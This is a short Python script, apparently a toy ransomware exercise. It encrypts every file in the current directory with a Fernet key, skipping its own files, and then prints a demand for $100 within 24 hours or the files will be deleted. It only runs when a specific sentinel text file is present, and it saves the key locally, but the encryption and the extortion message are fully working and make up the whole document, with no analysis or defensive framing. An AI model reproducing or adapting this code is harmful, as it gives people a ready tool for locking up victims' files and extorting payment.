#!/usr/bin/env python3

import os
from cryptography.fernet import Fernet

#find files

files = []

for file in os.listdir():
	if file == "ransomware.py" or file == "thekey.key" or file == "decrypt.py" or file == "decrypt2.py":
		continue
	if os.path.isfile(file):
		files.append(file)
		
# Only works if 'sonicthehedgehog.txt' is in the directory
if 'sonicthehedgehog.txt' in files:
	pass
else:
	print('Required file not found. Ending program.')
	exit()

key = Fernet.generate_key()

with open("thekey.key", "wb") as thekey:
	thekey.write(key)

for file in files:
	with open(file, "rb") as thefile:
		contents = thefile.read()
	contents_encrypted = Fernet(key).encrypt(contents)
	with open(file, "wb") as thefile:
		thefile.write(contents_encrypted)

print("Hello. Your files have been encrypted. If you do not pay $100 in 24 hours, the files will be deleted.")
print(files)
